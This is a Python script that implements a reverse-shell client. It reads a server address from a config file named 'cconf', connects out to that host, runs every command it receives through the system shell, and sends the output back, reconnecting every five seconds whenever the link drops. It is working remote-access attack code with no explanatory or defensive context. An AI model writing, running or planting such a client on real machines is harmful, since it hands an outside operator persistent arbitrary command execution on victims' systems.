#!/usr/bin/env python3
import socket
import subprocess
import json
import time
import os

SERVER_IP = ""
SERVER_PORT = 0

def read_conf():
  with open("cconf", "r") as f:
    global SERVER_IP
    global SERVER_PORT
    opts = f.read().split("\n")
    for opt in opts:
      if opt.startswith("SERVER_IP"):
        SERVER_IP = opt.split("=")[1]
      elif opt.startswith("SERVER_PORT"):
        SERVER_PORT = int(opt.split("=")[1])

def decode_subprocess_output(output):
  return json.dumps({
    "stdout": output.stdout.decode(),
    "stderr": output.stderr.decode()
  }).encode()

def get_command(socket):
  return json.loads(socket.recv(1024))["command"]

def communication_loop(s):
  while True:
    # get response, which is a command that sho=uld be executed in shell
    command = get_command(s)
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # send back output to server
    s.send(decode_subprocess_output(result))

def connection_loop():
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((SERVER_IP, SERVER_PORT))
      communication_loop(s)
    except:
      if s:
        try:
          s.close()
        except:
          pass
      time.sleep(5)

if __name__ == "__main__":
  read_conf()
  print(SERVER_IP, SERVER_PORT)
  connection_loop()
